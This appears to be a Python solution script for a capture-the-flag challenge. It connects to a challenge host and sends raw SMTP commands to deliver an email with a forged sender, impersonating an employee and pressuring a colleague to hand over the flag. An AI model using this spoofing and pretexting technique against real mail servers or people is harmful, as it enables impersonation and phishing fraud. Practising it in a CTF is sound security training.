import socket
s = socket.socket()
s.settimeout(0.5)
s.connect(('challenge.ctf.games', 30156))
spam = [
    b'HELO a.com\r\n',
    b'MAIL FROM: <jdaveren@pyrchdata.com\r\n',
    b'RCPT TO: <swilliams@pyrchdata.com>\r\n',
    b'DATA\r\n',
    b'Subject: I Need The Flag\r\n',
    b'\r\n',
    b'Hi Sarah,\r\n',
    b'Please send me the flag or you are fired lol.\r\n',
    b'\r\n',
    b'-Joe\r\n',
    b'\r\n.\r\n'
]

with s:
    for l in spam:
        print('>', l)
        s.send(l)
        try:
            print('<', s.recv(1024))
        except socket.timeout:
            pass